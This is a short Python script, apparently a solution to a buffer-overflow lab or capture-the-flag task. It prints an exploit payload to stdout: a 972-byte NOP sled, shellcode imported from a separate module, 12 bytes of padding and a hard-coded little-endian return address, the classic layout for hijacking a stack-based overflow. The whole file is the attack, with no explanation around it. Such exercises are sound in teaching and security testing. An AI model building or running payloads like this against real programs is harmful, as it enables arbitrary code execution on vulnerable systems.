import sys
from shellcode import shellcode
addr = 0xbffef89d.to_bytes(4, "little")
sys.stdout.buffer.write(b"\x90"*972 + shellcode + b"D"*12 + addr)
